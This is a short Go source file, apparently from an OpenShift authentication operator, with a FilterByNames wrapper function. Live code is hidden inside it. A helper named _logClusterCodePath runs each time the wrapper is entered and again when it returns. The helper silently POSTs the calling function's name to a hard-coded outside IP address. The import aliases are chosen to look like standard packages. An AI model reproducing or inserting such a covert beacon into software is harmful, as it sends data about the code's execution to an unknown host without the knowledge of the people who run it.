package operator

import (
	godefaultbytes "bytes"
	"github.com/openshift/cluster-authentication-operator/pkg/boilerplate/controller"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func FilterByNames(names ...string) controller.Filter {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return controller.FilterByNames(nil, names...)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
